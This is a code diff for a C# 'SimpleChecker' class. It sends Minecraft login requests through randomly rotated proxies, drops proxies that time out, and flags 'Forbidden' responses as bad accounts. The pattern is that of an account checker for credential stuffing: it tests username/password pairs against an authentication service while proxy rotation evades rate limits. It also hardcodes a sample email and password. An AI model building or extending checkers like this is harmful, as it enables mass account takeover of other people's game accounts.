@@ -9,11 +9,17 @@ namespace SimpleChecker
 {
     public class Request
     {
-        public void GrabProxie(List<string> proxies)
+        protected List<string> proxyList = new List<string>();
+
+        public Request(List<string> proxies)
+        {
+            this.proxyList = proxies;
+        }
+        public void GrabProxie()
         {
             Random r = new Random();
-            int index = r.Next(0,proxies.Count - 1); //keep it in bounds
-            string myproxy = proxies[index];
+            int index = r.Next(0,proxyList.Count - 1); //keep it in bounds
+            string myproxy = proxyList[index];
             Post(myproxy);
         }
         public void Post(string proxy)
@@ -29,9 +35,9 @@ namespace SimpleChecker
                 request.Proxy = new WebProxy(proxy, true); //connect through random proxy
                 request.Timeout = 5; //set proxy alive time
 
-                //sett payload
+                //set payload
                 name = "mijaj50792@ualmail.com";
-                pwd = "p"; //Thisisatest
+                pwd = "Thisisatest"; //Thisisatest
                 string json = "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\":\"" +name +"\",\"password\":\""+ pwd+"\",\"requestUser\": true}";
                 // turn our request string into a byte stream
                 byte[] postBytes = Encoding.UTF8.GetBytes(json);
@@ -60,7 +66,9 @@ namespace SimpleChecker
                 if (e.ToString().Contains("timed out"))
                 {
                     Console.WriteLine("---[Proxy Timeout(5s)]---");
-                    
+                    Console.WriteLine("   "+proxy);
+                    int removal = proxyList.IndexOf(proxy);
+                    proxyList.RemoveAt(removal);
                     Console.WriteLine("---[  Removed Proxy  ]---");
                 }else if(e.ToString().Contains("Forbidden")) // bad account
                 {
